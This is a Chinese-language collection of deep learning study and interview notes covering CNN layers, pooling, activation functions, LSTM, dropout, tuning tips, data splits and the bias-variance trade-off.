一个典型的卷积神经网络通常包含有三种层：卷积层（Convolution layer）、池化层（Pooling layer）、全连接层（Fully Connected layer）。仅用卷积层也有可能构建出很好的神经网络，但大部分神经网络还是会添加池化层和全连接层，它们更容易设计。 在计算神经网络的层数时，通常只统计具有权重和参数的层，池化层没有需要训练的参数，所以和之前的卷积层共同计为一层。 图中的 FC3 和 FC4 为全连接层，与标准的神经网络结构一致。整个神经网络各层的尺寸与参数如下表所示： 推荐一个直观感受卷积神经网络的网站。 为什么使用卷积相比标准神经网络，对于大量的输入数据，卷积过程有效地减少了 CNN 的参数数量，原因有以下两点： 参数共享（Parameter sharing）：特征检测如果适用于图片的某个区域，那么它也可能适用于图片的其他区域。即在卷积过程中，不管输入有多大，一个特征探测器（滤波器）就能对整个输入的某一特征进行探测。 稀疏连接（Sparsity of connections）：在每一层中，由于滤波器的尺寸限制，输入和输出之间的连接是稀疏的，每个输出值只取决于输入在局部的一小部分值。池化过程则在卷积后很好地聚合了特征，通过降维来减少运算量。 由于 CNN 参数数量较小，所需的训练样本就相对较少，因此在一定程度上不容易发生过拟合现象。并且 CNN 比较擅长捕捉区域位置偏移。即进行物体检测时，不太受物体在图片中位置的影响，增加检测的准确性和系统的健壮性。 然后这篇文章， 从感受视野的角度出发，解释了参数共享、稀疏连接、平移不变性等 然后卷积层可以看做全连接的一种简化形式:不全连接+不参数共享。所以全连接层的参数才如此之多。 为什么要使用许多小卷积核如3x3,而不是几个大卷积核？这在VGGNet的原始论文中得到了很好的解释。原因有二：首先，您可以使用几个较小的核而不是几个较大的核来获得相同的感受野并捕获更多的空间上下文，而且较小的内核计算量更少。其次，因为使用更小的核，您将使用更多的滤波器，您将能够使用更多的激活函数，从而使您的CNN学习到更具区分性的映射函数。 https://arxiv.org/pdf/1409.1556.pdf 为什么我们对图像使用卷积而不仅仅只使用FC层？这个答案有两部分。首先，卷积保存、编码和实际使用来自图像的空间信息。如果我们只使用FC层，我们将没有相对的空间信息。其次，卷积神经网络( CNNs )具有部分内建的平移不变性，因为每个卷积核充当其自身的滤波器/特征检测器。 CNNs为什么具有平移不变性？因为CNNs是以滑动窗口的方式进行卷积，卷积过程中参数共享并且稀疏连接，那么无论目标在图像的什么位置，都能扫描到。 池化层简介通过卷积层获得了图像的特征之后，理论上我们可以直接使用这些特征训练分类器（如softmax），但是这样做将面临巨大的计算量的挑战，而且容易产生过拟合的现象。为了进一步降低网络训练参数及模型的过拟合程度，我们对卷积层进行池化处理。池化常用方法为最大池化和平均池化。 最大池化：将输入拆分成不同的区域，输出的每个元素都是对应区域中元素的最大值，如下图所示： 池化过程类似于卷积过程，上图所示的池化过程中相当于使用了一个大小 f=2的滤波器，且池化步长 s=2。卷积过程中的几个计算大小的公式也都适用于池化过程。如果有多个通道，那么就对每个通道分别执行计算过程（池化不压缩通道数，卷积会压缩）。 对最大池化的一种直观解释是，元素值较大可能意味着池化过程之前的卷积过程提取到了某些特定的特征，池化过程中的最大化操作使得只要在一个区域内提取到某个特征，它都会保留在最大池化的输出中。但是，没有足够的证据证明这种直观解释的正确性，而最大池化被使用的主要原因是它在很多实验中的效果都很好。 平均池化：就是从取某个区域的最大值改为求这个区域的平均值： 池化过程的特点之一是，它有一组超参数，但是并没有参数需要学习。池化过程的超参数包括滤波器的大小 f、步长 s，以及选用最大池化还是平均池化。而填充 p则很少用到。 池化过程的输入维度为： n_H \\times n_W \\times n_c输出维度为： \\biggl\\lfloor \\frac{n_H-f}{s}+1 \\biggr\\rfloor \\times \\biggl\\lfloor \\frac{n_W-f}{s}+1 \\biggr\\rfloor \\times n_c 池化层的作用通过卷积层获得了图像的特征之后，理论上我们可以直接使用这些特征训练分类器（如softmax），但是这样做将面临巨大的计算量的挑战，而且容易产生过拟合的现象。为了进一步降低网络训练参数及模型的过拟合程度，我们对卷积层进行池化处理。 池化层作用：（1）降维，提高计算速度。相对卷积操作，池化是以指数形式降维，理想情况下，还能保留显著特征。（2）同时减小噪声提高所提取特征的稳健性。（3）可以扩大感知野（4）在图像识别领域，池化还能提供平移、旋转和尺度不变性（5）池化的输出是一个固定大小的矩阵，这对分类问题很重要 池化为什么对平移不变性有贡献池化在丢失少量信息的情况下，会对有效信息进行最大程度的激活。以下解答摘自池化-ufldl： 如果人们选择图像中的连续范围作为池化区域，并且只是池化相同(重复)的隐藏单元产生的特征，那么，这些池化单元就具有平移不变性 (translation invariant)。这就意味着即使图像经历了一个小的平移之后，依然会产生相同的 (池化的) 特征。 在很多任务中 (例如物体检测、声音识别)，我们都更希望得到具有平移不变性的特征，因为即使图像经过了平移，样例(图像)的标记仍然保持不变。 例如，如果你处理一个MNIST数据集的数字，把它向左侧或右侧平移，那么不论最终的位置在哪里，你都会期望你的分类器仍然能够精确地将其分类为相同的数字。 再例如，医学图像分割，可以查看感兴趣的区域，从而忽略不需要的区域的干扰。如看骨折，只需要将骨头所表示的特征图像（一般是一定会度值的一块区域）从背景（如肌肉，另一种灰度值）分割出来，而其它的肌肉等则不显示（为黑色） SPP空间金字塔池化卷积神经网络要求输入的图像尺寸固定，这种需要会降低图像识别的精度。SPPNet（Spatial Pyramid Pooling）的初衷非常明晰，就是希望网络对输入的尺寸更加灵活，分析到卷积网络对尺寸并没有要求，固定尺寸的要求完全来源于全连接层部分，因而借助空间金字塔池化的方法来衔接两者，SPPNet在检测领域的重要贡献是避免了R-CNN的变形、重复计算等问题，在效果不衰减的情况下，大幅提高了识别速度。 论文翻译：Spatial Pyramid Pooling in Deep Convolutional Networks for Visual Recognition 全连接层的作用全连接层相对卷积层来说，就是:不稀疏连接+不参数共享。全连接层的每一个结点都与上一层的所有结点相连，用来把前边提取到的特征综合起来。由于其全相连的特性，一般全连接层的参数也是最多的，可占全网络参数的80%。 全连接会把上一层的多维特征图转化成一个固定长度的特征向量，这个特征向量虽然丢失了图像的位置信息，但是它组合了图像中最具特点的图像特征，用于后面的Softmax分类。 换一种说法，全连接层的作用是 将网络学习到的特征映射到样本标记空间（卷积池化层层等作用是将原始数据映射到隐层特征空间）。 在实际使用中，全连接层可由卷积操作实现：对前层是全连接的全连接层可以转化为卷积核为1x1的卷积；而前层是卷积层的全连接层可以转化为卷积核为hxw的全局卷积，h和w分别为前层卷积结果的高和宽。 因为传统的网络输出的都是分类，也就是几个类别的概率，甚至就是一个数，比如类别号。那么全连接层就是高度提纯的特征了，方便交给最后的分类器或者回归。 其实卷积神经网络中全连接层的设计，属于人们在传统特征提取+分类思维下的一种”迁移学习”思想，但后期在很多end-to-end模型中，其最初用于分类的功能被弱化了，而全连接层参数又过多，所以人们一直试图设计出各种不含全连接层又能达到相同效果的网络。 知乎：全连接层的作用是什么？ 什么是端到端的网络深度学习中最令人振奋的最新动态之一就是端到端深度学习的兴起。简而言之，以前有一些数据处理系统或者学习系统，它们需要多个阶段的处理。那么端到端深度学习就是忽略所有这些不同的阶段，用单个神经网络代替它。 传统的机器学习任务经常需要分别训练多个模型（涉及人为介入的特征工程），输入数据后，无法通过一个模型直接得到结果，是非端到端的。现在的深度学习模式是【输入→（1个）模型→（直接出）结果】，模型会自动提取特征。 更多详情见 吴恩达 什么是端到端的深度学习 请简要介绍下tensorflow的计算图Tensorflow是一个通过计算图的形式来表述计算的编程系统，计算图也叫数据流图，可以把计算图看做是一种有向图，Tensorflow中的每一个节点都是计算图上的一个Tensor, 也就是张量，而节点之间的边描述了计算之间的依赖关系(定义时)和数学操作(运算时)。如下两图表示：a=x*y; b=a+z; c=tf.reduce_sum(b); name_scope 和 variable_scope的区别 name_scope： 为了更好地管理变量的命名空间而提出的。比如在 tensorboard 中，因为引入了 name_scope， Graph 看起来才井然有序。 variable_scope： 跟 tf.get_variable() 配合使用，实现变量共享。 详见：https://blog.csdn.net/jacke121/article/details/77622834 怎么加快训练的速度 加快数据的读取速度, 具体详见 数据读取 可以构建tensorflow计算图，然后Feeding，减少与C++后端的交互次数; 或者从文件读取数据，使用多线程与管道; 或者预加载数据，即在TensorFlow图中定义常量或变量来保存所有数据，仅适用于数据量比较小的情况。 加快收敛的速度，详解神经网络的优化算法 要是服务器足够，同时设置验证多个超参，边训练边验证，用tensorflow对比查看，尽快得到满意结果 deep learning（rnn、cnn）调参经验结合最近的项目经历进行整理，待处理。。使用谷歌最近开源的AutoML工具包 NNI知乎:深度学习调参有哪些技巧？ 一、参数初始化下面几种方式,随便选一个,结果基本都差不多。但是一定要做。否则可能会减慢收敛速度，影响收敛结果，甚至造成Nan等一系列问题。下面的n_in为网络的输入大小，n_out为网络的输出大小，n为n_in或(n_in+n_out)0.5Xavier初始法论文：http://jmlr.org/proceedings/papers/v9/glorot10a/glorot10a.pdfHe初始化论文：https://arxiv.org/abs/1502.01852uniform均匀分布初始化：w = np.random.uniform(low=-scale, high=scale, size=[n_in,n_out])Xavier初始法，适用于普通激活函数(tanh,sigmoid)：scale = np.sqrt(3/n)He初始化，适用于ReLU：scale = np.sqrt(6/n)normal高斯分布初始化：w = np.random.randn(n_in,n_out) stdev # stdev为高斯分布的标准差，均值设为0Xavier初始法，适用于普通激活函数 (tanh,sigmoid)：stdev = np.sqrt(n)He初始化，适用于ReLU：stdev = np.sqrt(2/n)svd初始化：对RNN有比较好的效果。参考论文：https://arxiv.org/abs/1312.6120 二、数据预处理方式zero-center ,这个挺常用的.X -= np.mean(X, axis = 0) # zero-centerX /= np.std(X, axis = 0) # normalizePCA whitening,这个用的比较少. 三、训练技巧要做梯度归一化,即算出来的梯度除以minibatch sizeclip c(梯度裁剪): 限制最大梯度,其实是value = sqrt(w1^2+w2^2….),如果value超过了阈值,就算一个衰减系系数,让value的值等于阈值: 5,10,15 dropout对小数据防止过拟合有很好的效果,值一般设为0.5,小数据上dropout+sgd在我的大部分实验中，效果提升都非常明显.因此可能的话，建议一定要尝试一下。 dropout的位置比较有讲究, 对于RNN,建议放到输入-&gt;RNN与RNN-&gt;输出的位置.关于RNN如何用dropout,可以参考这篇论文:http://arxiv.org/abs/1409.2329 adam,adadelta等,在小数据上,我这里实验的效果不如sgd, sgd收敛速度会慢一些，但是最终收敛后的结果，一般都比较好。如果使用sgd的话,可以选择从1.0或者0.1的学习率开始,隔一段时间,在验证集上检查一下,如果cost没有下降,就对学习率减半. 我看过很多论文都这么搞,我自己实验的结果也很好. 当然,也可以先用ada系列先跑,最后快收敛的时候,更换成sgd继续训练.同样也会有提升.据说adadelta一般在分类问题上效果比较好，adam在生成问题上效果比较好。 除了gate之类的地方,需要把输出限制成0-1之外,尽量不要用sigmoid,可以用tanh或者relu之类的激活函数.1. sigmoid函数在-4到4的区间里，才有较大的梯度。之外的区间，梯度接近0，很容易造成梯度消失问题。2. 输入0均值，sigmoid函数的输出不是0均值的。rnn的dim和embdding size,一般从128上下开始调整. batch size,一般从128左右开始调整.batch size合适最重要,并不是越大越好. word2vec初始化,在小数据上,不仅可以有效提高收敛速度,也可以可以提高结果. 四、尽量对数据做shuffleLSTM 的forget gate的bias,用1.0或者更大的值做初始化,可以取得更好的结果,来自这篇论文:http://jmlr.org/proceedings/papers/v37/jozefowicz15.pdf, 我这里实验设成1.0,可以提高收敛速度.实际使用中,不同的任务,可能需要尝试不同的值. Batch Normalization据说可以提升效果，不过我没有尝试过，建议作为最后提升模型的手段，参考论文：Accelerating Deep Network Training by Reducing Internal Covariate Shift如果你的模型包含全连接层（MLP），并且输入和输出大小一样，可以考虑将MLP替换成Highway Network,我尝试对结果有一点提升，建议作为最后提升模型的手段，原理很简单，就是给输出加了一个gate来控制信息的流动，详细介 五、EnsembleEnsemble是论文刷结果的终极核武器,深度学习中一般有以下几种方式同样的参数,不同的初始化方式不同的参数,通过cross-validation,选取最好的几组同样的参数,模型训练的不同阶段，即不同迭代次数的模型。不同的模型,进行线性融合. 例如RNN和传统模型. LSTM结构推导，为什么比RNN好推导forget gate，input gate，cell state， hidden information等的变化；因为LSTM有进有出且当前的cell informaton是通过input gate控制之后叠加的，RNN是叠乘，因此LSTM一定程度上可以防止梯度消失或者爆炸 为什么LSTM模型中既存在sigmoid又存在tanh两种激活函数为什么不是选择统一一种sigmoid或者tanh，而是混合使用呢这样的目的是什么 sigmoid 用在了各种gate上，描述每个组件应该通过多少。它的值在 0 到 1 的范围内，且大多数时间非常接近于 0 或 1，值为零意味着“不要让任何信息通过”，而值为1意味着“让所有信息都通过！”。 tanh 用在了状态和输出上，是对数据的处理，这个用 ReLU 或其他激活函数也可以。 Sigmoid、Tanh、ReLu有什么优缺点，有没改进的激活函数Maxout使用两套w,b参数，输出较大值。本质上Maxout可以看做Relu的泛化版本，因为如果一套w,b全都是0的话，那么就是普通的ReLU。Maxout可以克服Relu的缺点，但是参数数目翻倍。 什么是激活函数，为什么要用非线性激活函数如下图，在神经元中，输入的 inputs 通过加权，求和后，还被作用了一个函数，这个函数就是激活函数 Activation Function。 不用激活函数或使用线性激活函数，和直接使用 Logistic 回归没有区别，因为无论神经网络有多少层，输出都是输入的线性组合，与没有隐藏层效果相当，就成了最原始的感知器了。 非线性激活函数给神经元引入了非线性因素，使得神经网络可以任意逼近任何非线性函数，这样神经网络就可以应用到众多的非线性模型中。非线性激励函数最早的想法是sigmoid函数或者tanh函数，输出有界，很容易充当下一层输入。 ReLu为什么要好过于tanh和sigmoidsigmoid、tanh和RelU函数图： 第一，ReLU本质上是分段线性模型，前向计算和反向传播的偏导非常简单，无需指数之类操作。 第二，ReLU不容易发生梯度消失问题，Tanh和Logistic激活函数在两端的时候导数容易趋近于零，多级连乘后梯度更加约等于0。 第三，ReLU关闭了右边，从而会使得很多的隐层输出为0，即网络变得稀疏，起到了类似L1的正则化作用，可以在一定程度上缓解过拟合。 但是Relu也有自己的缺点，它缺少对数据的控制力，不像sigmoid可以把任意维度的数据压缩到0到1之间。训练过程中有些数据的维度完全没有得到控制，有的幅度到达了上千，有的依然是一个极小的小数。这样看起来，似乎sigmoid前向更靠谱，relu后向更强。那么怎么解决ReLu的振幅问题呢？可以考虑在初始化上做处理，详见 xavier初始化 最后加一句，现在主流的做法，会多做一步batch normalization，尽可能保证每一层网络的输入具有相同的分布[1]。而最新的paper[2]，他们在加入bypass connection之后，发现改变batch normalization的位置会有更好的效果。 [1] Ioffe S, Szegedy C. Batch normalization: Accelerating deep network training by reducing internal covariate shift[J]. arXiv preprint arXiv:1502.03167, 2015.[2] He, Kaiming, et al. “Identity Mappings in Deep Residual Networks.” arXiv preprint arXiv:1603.05027 (2016). 知乎链接：请问人工神经网络中的activation function的作用具体是什么？为什么ReLu要好过于tanh和sigmoid function? 神经网络里的正则化为什么能防止过拟合 直观解释正则化因子设置的足够大的情况下，为了使成本函数最小化，权重矩阵 W 就会被设置为接近于 0 的值，直观上相当于消除了很多神经元的影响，那么大的神经网络就会变成一个较小的网络。当然，实际上隐藏层的神经元依然存在，但是其影响减弱了，便不会导致过拟合。 数学解释假设神经元中使用的激活函数为g(z) = tanh(z)（sigmoid 同理）。 在加入正则化项后，当 λ 增大，导致 W[l]减小，Z[l]=W[l]a[l−1]+b[l]便会减小。由上图可知，在 z 较小（接近于 0）的区域里，tanh(z)函数近似线性，所以每层的函数就近似线性函数，整个网络就成为一个简单的近似线性的网络，因此不会发生过拟合。 其他解释在权值 w[L]变小之下，输入样本 X 随机的变化不会对神经网络模造成过大的影响，神经网络受局部噪音的影响的可能性变小。这就是正则化能够降低模型方差的原因。 什麽样的资料集不适合用深度学习 数据集太小，数据样本不足时，深度学习相对其它机器学习算法，没有明显优势。 数据集没有局部相关特性，目前深度学习表现比较好的领域主要是图像／语音／自然语言处理等领域，这些领域的一个共性是局部相关性。图像中像素组成物体，语音信号中音位组合成单词，文本数据中单词组合成句子，这些特征元素的组合一旦被打乱，表示的含义同时也被改变。对于没有这样的局部相关性的数据集，不适于使用深度学习算法进行处理。举个例子：预测一个人的健康状况，相关的参数会有年龄、职业、收入、家庭状况等各种元素，将这些元素打乱，并不会影响相关的结果。 广义线性模型是怎被应用在深度学习中A Statistical View of Deep Learning (I): Recursive GLMs深度学习从统计学角度，可以看做递归的广义线性模型。 广义线性模型相对于经典的线性模型(y=wx+b)，核心在于引入了连接函数g(.)，形式变为：y=g−1(wx+b)。 深度学习时递归的广义线性模型，神经元的激活函数，即为广义线性模型的链接函数。逻辑回归（广义线性模型的一种）的Logistic函数即为神经元激活函数中的Sigmoid函数，很多类似的方法在统计学和神经网络中的名称不一样，容易引起初学者（这里主要指我）的困惑。 下图是一个对照表 深度学习与传统机器学习的数据划分区别对于一个需要解决的问题的样本数据，在建立模型的过程中，数据会被划分为以下几个部分： 1）训练集（train set）：用训练集对算法或模型进行训练过程；2）验证集（development set）：利用验证集（又称为简单交叉验证集，hold-out cross validation set）进行交叉验证，选择出最好的模型；3）测试集（test set）：最后利用测试集对模型进行测试，获取模型运行的无偏估计（对学习方法进行评估）。 在小数据量的时代，如 100、1000、10000 的数据量大小，可以将数据集按照以下比例进行划分： 1）无验证集的情况：70% / 30%；2）有验证集的情况：60% / 20% / 20%； 而在如今的大数据时代，对于一个问题，我们拥有的数据集的规模可能是百万级别的，所以验证集和测试集所占的比重会趋向于变得更小。 验证集的目的是为了验证不同的算法哪种更加有效，所以验证集只要足够大到能够验证大约 2-10 种算法哪种更好，而不需要使用 20% 的数据作为验证集。如百万数据中抽取 1 万的数据作为验证集就可以了。 测试集的主要目的是评估模型的效果，如在单个分类器中，往往在百万级别的数据中，我们选择其中 1000 条数据足以评估单个模型的效果。吴恩达给出的建议是： 1）100 万数据量：98% / 1% / 1%；2）超百万数据量：99.5% / 0.25% / 0.25%（或者99.5% / 0.4% / 0.1%） 神经网络发展历史1949年Hebb提出了神经心理学学习范式——Hebbian学习理论1952年，IBM的Arthur Samuel写出了西洋棋程序1957年，Rosenblatt的感知器算法是第二个有着神经系统科学背景的机器学习模型. 3年之后，Widrow因发明Delta学习规则而载入ML史册，该规则马上就很好的应用到了感知器的训练中感知器的热度在1969被Minskey一盆冷水泼灭了。他提出了著名的XOR问题，论证了感知器在类似XOR问题的线性不可分数据的无力。 尽管BP的思想在70年代就被Linnainmaa以“自动微分的翻转模式”被提出来，但直到1981年才被Werbos应用到多层感知器(MLP)中，NN新的大繁荣。 1991年的Hochreiter和2001年的Hochreiter的工作，都表明在使用BP算法时，NN单元饱和之后会发生梯度损失。又发生停滞。 时间终于走到了当下，随着计算资源的增长和数据量的增长。一个新的NN领域——深度学习出现了。 简言之，MP模型+sgn—-&gt;单层感知机（只能线性）+sgn— Minsky 低谷 —&gt;多层感知机+BP+sigmoid—- (低谷) —&gt;深度学习+pre-training+ReLU/sigmoid 换一种说法 sigmoid会饱和，造成梯度消失。于是有了ReLU。ReLU负半轴是死区，造成梯度变0。于是有了LeakyReLU，PReLU。强调梯度和权值分布的稳定性，由此有了ELU，以及较新的SELU。太深了，梯度传不下去，于是有了highway。干脆连highway的参数都不要，直接变残差，于是有了ResNet。 强行稳定参数的均值和方差，于是有了BatchNorm。在梯度流中增加噪声，于是有了 Dropout。RNN梯度不稳定，于是加几个通路和门控，于是有了LSTM。LSTM简化一下，有了GRU。GAN的JS散度有问题，会导致梯度消失或无效，于是有了WGAN。WGAN对梯度的clip有问题，于是有了WGAN-GP。 神经网络中激活函数的真正意义？一个激活函数需要具有哪些必要的属性？还有哪些属性是好的属性但不必要的 非线性：即导数不是常数。这个条件是多层神经网络的基础，保证多层网络不退化成单层线性网络。这也是激活函数的意义所在。 几乎处处可微：可微性保证了在优化中梯度的可计算性。传统的激活函数如sigmoid等满足处处可微。对于分段线性函数比如ReLU，只满足几乎处处可微（即仅在有限个点处不可微）。对于SGD算法来说，由于几乎不可能收敛到梯度接近零的位置，有限的不可微点对于优化结果不会有很大影响[1]。 计算简单：非线性函数有很多。极端的说，一个多层神经网络也可以作为一个非线性函数，类似于Network In Network[2]中把它当做卷积操作的做法。但激活函数在神经网络前向的计算次数与神经元的个数成正比，因此简单的非线性函数自然更适合用作激活函数。这也是ReLU之流比其它使用Exp等操作的激活函数更受欢迎的其中一个原因。 非饱和性（saturation）：饱和指的是在某些区间梯度接近于零（即梯度消失），使得参数无法继续更新的问题。最经典的例子是Sigmoid，它的导数在x为比较大的正值和比较小的负值时都会接近于0。更极端的例子是阶跃函数，由于它在几乎所有位置的梯度都为0，因此处处饱和，无法作为激活函数。ReLU在x&gt;0时导数恒为1，因此对于再大的正值也不会饱和。但同时对于x&lt;0，其梯度恒为0，这时候它也会出现饱和的现象（在这种情况下通常称为dying ReLU）。Leaky ReLU[3]和PReLU[4]的提出正是为了解决这一问题。 单调性（monotonic）：即导数符号不变。这个性质大部分激活函数都有，除了诸如sin、cos等。个人理解，单调性使得在激活函数处的梯度方向不会经常改变，从而让训练更容易收敛。 输出范围有限：有限的输出范围使得网络对于一些比较大的输入也会比较稳定，这也是为什么早期的激活函数都以此类函数为主，如Sigmoid、TanH。但这导致了前面提到的梯度消失问题，而且强行让每一层的输出限制到固定范围会限制其表达能力。因此现在这类函数仅用于某些需要特定输出范围的场合，比如概率输出（此时loss函数中的log操作能够抵消其梯度消失的影响[1]）、LSTM里的gate函数。 接近恒等变换（identity）：即约等于x。这样的好处是使得输出的幅值不会随着深度的增加而发生显著的增加，从而使网络更为稳定，同时梯度也能够更容易地回传。这个与非线性是有点矛盾的，因此激活函数基本只是部分满足这个条件，比如TanH只在原点附近有线性区（在原点为0且在原点的导数为1），而ReLU只在x&gt;0时为线性。这个性质也让初始化参数范围的推导更为简单[5][4]。额外提一句，这种恒等变换的性质也被其他一些网络结构设计所借鉴，比如CNN中的ResNet[6]和RNN中的LSTM。 参数少：大部分激活函数都是没有参数的。像PReLU带单个参数会略微增加网络的大小。还有一个例外是Maxout[7]，尽管本身没有参数，但在同样输出通道数下k路Maxout需要的输入通道数是其它函数的k倍，这意味着神经元数目也需要变为k倍；但如果不考虑维持输出通道数的情况下，该激活函数又能将参数个数减少为原来的k倍。 归一化（normalization）：这个是最近才出来的概念，对应的激活函数是SELU[8]，主要思想是使样本分布自动归一化到零均值、单位方差的分布，从而稳定训练。在这之前，这种归一化的思想也被用于网络结构的设计，比如Batch Normalization[9]。 更多详情：https://www.zhihu.com/question/67366051 CNN经典网络对比 更多详情见：从LeNet到AlexNetDeep Learning回顾#之LeNet、AlexNet、GoogLeNet、VGG、ResNet dropout随机失活dropout（随机失活）是在神经网络的隐藏层为每个神经元结点设置一个随机消除的概率，保留下来的神经元形成一个结点较少、规模较小的网络用于训练。dropout 正则化较多地被使用在计算机视觉（Computer Vision）领域。 对于单个神经元，其工作是接收输入并产生一些有意义的输出。但是加入了 dropout 后，输入的特征都存在被随机清除的可能，所以该神经元不会再特别依赖于任何一个输入特征，即不会给任何一个输入特征设置太大的权重。 因此，通过传播过程，dropout 将产生和 L2 正则化相同的收缩权重的效果。 对于不同的层，设置的keep_prob也不同。一般来说，神经元较少的层，会设keep_prob为 1.0，而神经元多的层则会设置比较小的keep_prob。 dropout 的一大缺点是成本函数无法被明确定义。因为每次迭代都会随机消除一些神经元结点的影响，因此无法确保成本函数单调递减。因此，使用 dropout 时，先将keep_prob全部设置为 1.0 后运行代码，确保 J(w,b)函数单调递减，再打开 dropout。 简单说下sigmoid激活函数常用的非线性激活函数有sigmoid、tanh、relu等等，前两者sigmoid/tanh比较常见于全连接层，后者relu常见于卷积层。这里先简要介绍下最基础的sigmoid函数（btw，在本博客中SVM那篇文章开头有提过）。 sigmoid的函数表达式如下 其中z是一个线性组合，比如z可以等于：b + w1x1 + w2x2。通过代入很大的正数或很小的负数到g(z)函数中可知，其结果趋近于0或1。 因此，sigmoid函数g(z)的图形表示如下（ 横轴表示定义域z，纵轴表示值域g(z) ）： 也就是说，sigmoid函数的功能是相当于把一个实数压缩至0到1之间。当z是非常大的正数时，g(z)会趋近于1，而z是非常小的负数时，则g(z)会趋近于0。 压缩至0到1有何用处呢用处是这样一来便可以把激活函数看作一种“分类的概率”，比如激活函数的输出为0.9的话便可以解释为90%的概率为正样本。 举个例子，如下图（图引自Stanford机器学习公开课） z = b + w1x1 + w2x2，其中b为偏置项 假定取-30，w1、w2都取为20 如果x1 = 0，x2 = 0，则z = -30，g(z) = 1/( 1 + e^-z )趋近于0。此外，从上图sigmoid函数的图形上也可以看出，当z=-30的时候，g(z)的值趋近于0如果x1 = 0，x2 = 1，或x1 =1,x2 = 0，则z = b + w1x1 + w2x2 = -30 + 20 = -10，同样，g(z)的值趋近于0如果x1 = 1，x2 = 1，则z = b + w1x1 + w2x2 = -30 + 201 + 201 = 10，此时，g(z)趋近于1。 换言之，只有x1和x2都取1的时候，g(z)→1，判定为正样本；而当只要x1或x2有一个取0的时候，g(z)→0，判定为负样本，如此达到分类的目的。 综上，sigmod函数，是逻辑斯蒂回归的压缩函数，它的性质是可以把分隔平面压缩到[0,1]区间一个数（向量），在线性分割平面值为0时候正好对应sigmod值为0.5，大于0对应sigmod值大于0.5、小于0对应sigmod值小于0.5；0.5可以作为分类的阀值；exp的形式最值求解时候比较方便，用相乘形式作为logistic损失函数，使得损失函数是凸函数；不足之处是sigmod函数在y趋于0或1时候有死区，控制不好在bp形式传递loss时候容易造成梯度弥撒。 上采样和下采样缩小图像（或称为下采样 subsampled 和降采样 downsampled）的主要目的有两个1）使得图像符合显示区域的大小2）生成对应图像的缩略图。 放大图像（或称为上采样 upsampling 和图像插值 interpolating）的主要目的是放大原图像，从而可以显示在更高分辨率的显示设备上。 上采样原理：内插值，即在原有图像像素的基础上在像素点之间采用合适的插值算法插入新的元素。 什么是感知器当激活函数的 返回值是两个固定值 的时候，可以称为此时的神经网络为感知器。 因为感知器的返回值只有两种情况，所以感知器只能解决二类线性可分的问题，感知器比较适合应用到模式分类问题中 神经网络隐层维度规则 偏差方差及其应对方法“偏差-方差分解”（bias-variance decomposition）是解释学习算法泛化性能的一种重要工具。 泛化误差可分解为偏差、方差与噪声之和： 偏差：度量了学习算法的期望预测与真实结果的偏离程度，即刻画了学习算法本身的拟合能力； 方差：度量了同样大小的训练集的变动所导致的学习性能的变化，即刻画了数据扰动所造成的影响； 噪声：表达了在当前任务上任何学习算法所能够达到的期望泛化误差的下界，即刻画了学习问题本身的难度。 偏差-方差分解说明，泛化性能是由学习算法的能力、数据的充分性以及学习任务本身的难度所共同决定的。给定学习任务，为了取得好的泛化性能，则需要使偏差较小，即能够充分拟合数据，并且使方差较小，即使得数据扰动产生的影响小。 在欠拟合（underfitting）的情况下，出现高偏差（high bias）的情况，即不能很好地对数据进行分类。 当模型设置的太复杂时，训练集中的一些噪声没有被排除，使得模型出现过拟合（overfitting）的情况，在验证集上出现高方差（high variance）的现象。 当训练出一个模型以后，如果： 训练集的错误率较小，而验证集的错误率却较大，说明模型存在较大方差，可能出现了过拟合； 训练集和开发集的错误率都较大，且两者相当，说明模型存在较大偏差，可能出现了欠拟合； 训练集错误率较大，且开发集的错误率远较训练集大，说明方差和偏差都较大，模型很差； 训练集和开发集的错误率都较小，且两者的相差也较小，说明方差和偏差都较小，这个模型效果比较好。 偏差和方差的权衡问题对于模型来说十分重要。 最优误差通常也称为“贝叶斯误差”。 应对方法存在高偏差： 扩大网络规模，如添加隐藏层或隐藏单元数目； 寻找合适的网络架构，使用更大的 NN 结构； 花费更长时间训练。 存在高方差： 获取更多的数据； 使用正则化（regularization）技术，降低模型的复杂度； 寻找更合适的网络结构。甚至使用bagging算法比如随机森林，训练多个弱模型，然后组合在一起，进行投票等 不断尝试，直到找到低偏差、低方差的框架。 在深度学习的早期阶段，没有太多方法能做到只减少偏差或方差而不影响到另外一方。而在大数据时代，深度学习对监督式学习大有裨益，使得我们不用像以前一样太过关注如何平衡偏差和方差的权衡问题，通过以上方法可以在不增加某一方的前提下减少另一方的值。 CNN最成功的应用是在CV，那为什么NLP和Speech的很多问题也可以用CNN解出来？为什么AlphaGo里也用了CNN？这几个不相关的问题的相似性在哪里？CNN通过什么手段抓住了这个共性？Deep Learning -Yann LeCun, Yoshua Bengio &amp; Geoffrey HintonLearn TensorFlow and deep learning, without a Ph.D.The Unreasonable Effectiveness of Deep Learning -LeCun 16 NIPS Keynote 以上几个不相关问题的相关性在于，都存在局部与整体的关系，由低层次的特征经过组合，组成高层次的特征，并且得到不同特征之间的空间相关性。如下图：低层次的直线／曲线等特征，组合成为不同的形状，最后得到汽车的表示。 CNN抓住此共性的手段主要有四个：局部连接／权值共享／池化操作／多层次结构。局部连接使网络可以提取数据的局部特征；权值共享大大降低了网络的训练难度，一个Filter只提取一个特征，在整个图片（或者语音／文本） 中进行卷积；池化操作与多层次结构一起，实现了数据的降维，将低层次的局部特征组合成为较高层次的特征，从而对整个图片进行表示。如下图： 上图中，如果每一个点的处理使用相同的Filter，则为全卷积，如果使用不同的Filter，则为Local-Conv。 为什么很多做人脸的Paper会最后加入一个Local Connected Conv如果每一个点的处理使用相同的Filter(即参数共享)，则为全卷积，如果使用不同的Filter，则为Local-Conv(local的意思就是参数不共享)。 DeepFace 先进行了两次全卷积＋一次池化，提取了低层次的边缘／纹理等特征。后接了3个Local-Conv层，这里是用Local-Conv的原因是，人脸在不同的区域存在不同的特征（眼睛／鼻子／嘴的分布位置相对固定），当不存在全局的局部特征分布时，Local-Conv更适合特征的提取。当数据集具有全局的局部特征分布时，也就是说局部特征之间有较强的相关性，适合用全卷积。 “不存在全局的局部特征分布”，可以这么理解，人的鼻子和嘴是局部特征，但在全局特征(脸)中并不是广泛分布的，它们是独一无二的。所以说不存在局部连接学习了鼻子的特征，然后把特征应用到脸的其他部位。 链接：http://blog.csdn.net/u014365862/article/details/77795902 